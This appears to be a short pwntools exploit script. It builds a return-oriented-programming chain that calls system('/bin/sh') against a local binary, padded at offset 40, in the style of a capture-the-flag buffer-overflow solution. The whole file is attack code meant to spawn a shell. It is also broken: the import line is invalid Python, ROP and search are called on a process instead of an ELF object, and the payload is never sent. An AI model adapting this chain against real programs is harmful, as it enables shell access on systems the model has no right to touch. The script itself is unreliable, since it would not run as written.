#!/usr/bin/env python3
import pwntools pwn
from pwn import *

p = process('./binary')

rop = ROP(p)  
rop.call('system', [next(p.search("/bin/sh"))])  
rop.call('exit', [0])  
log.info("ROP Chain: %s" % rop.dump()) 

payload = fit({40: rop}, filler="\x00")    
log.info("Payload size: %i bytes" % len(payload))  

